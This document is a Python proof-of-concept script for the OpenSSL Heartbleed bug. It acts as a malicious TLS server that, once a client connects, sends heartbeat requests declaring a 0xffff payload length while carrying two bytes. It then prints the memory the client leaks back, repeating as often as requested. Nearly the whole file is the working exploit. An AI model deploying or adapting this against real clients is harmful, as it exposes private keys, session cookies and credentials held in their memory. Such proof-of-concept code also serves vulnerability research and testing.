import socket
import sys
import getopt
import time

from tlslite.api import *
from tlslite.messages import *
from tlslite import __version__

def usage():
    print "heartbleed_server.py   PoC for the openSSL heartbleed vulnerability"
    print "      -h  --  show this message"
    print "      -n  --  Set the number of requests to make, more will grab more memory"
    print "      -k  --  Set the private key"
    print "      -c  --  Set the cert"
    print "      -d  --  Set the add:port to listen on,  EX: -d 127.0.0.1:5000"

try:
    opts, args = getopt.getopt(sys.argv[1:], "hn:k:d:c:")
except getopt.GetoptError as err:
    print str(err)
    usage()
    sys.exit(2)

numb = 1
address = ("127.0.0.1", 5555)

for o, a in opts:
    if o == "-n":
        numb = int(a)
    elif o == "-h":
        usage()
        sys.exit()
    elif o == "-d":
        address = a.split(":")
        if len(address) != 2:
            raise SyntaxError("Must specify <host>:<port>")
        address = ( address[0], int(address[1]) )
    elif o == "-k":
        s = open(a, "rb").read()
        privateKey = parsePEMKey(s, private=True)            
    elif o == "-c":
        s = open(a, "rb").read()
        x509 = X509()
        x509.parse(s)
        certChain = X509CertChain([x509])
    else:
        assert False, "unhandled option"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(address)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

sock.listen(1)

conn, addr = sock.accept()
print 'Connection address:', addr

connection = TLSConnection(conn)

settings = HandshakeSettings()
settings.heart_beat = True


try:
    start = time.clock()

    connection.handshakeServer(certChain=certChain,
                                  privateKey=privateKey,
                                  verifierDB=None,
                                  tacks=None,
                                  activationFlags=0,
                                  sessionCache=None,
                                  settings=settings,
                                  nextProtos=[b"http/1.1"])
                                  # As an example (does not work here):
                                  #nextProtos=[b"spdy/3", b"spdy/2", b"http/1.1"])
    stop = time.clock()
except TLSRemoteAlert as a:
    if a.description == AlertDescription.user_canceled:
        print(str(a))
    else:
        raise
except TLSLocalAlert as a:
    if a.description == AlertDescription.unknown_psk_identity:
        if username:
            print("Unknown username")
        else:
            raise
    elif a.description == AlertDescription.bad_record_mac:
        if username:
            print("Bad username or password")
        else:
            raise
    elif a.description == AlertDescription.handshake_failure:
        print("Unable to negotiate mutually acceptable parameters")
    else:
        raise
    
connection.ignoreAbruptClose = True

heartbeat = HeartBeat()
heartbeat.create(type=1,
                pay_len=0xffff,
                payload="AA")


# up the range numbs to get more memory, sometimes it repeats.

for x in range(0, numb):
    for result in connection._sendMsg(heartbeat):
        pass

    print connection.readPOC(0xffff),

connection.close()
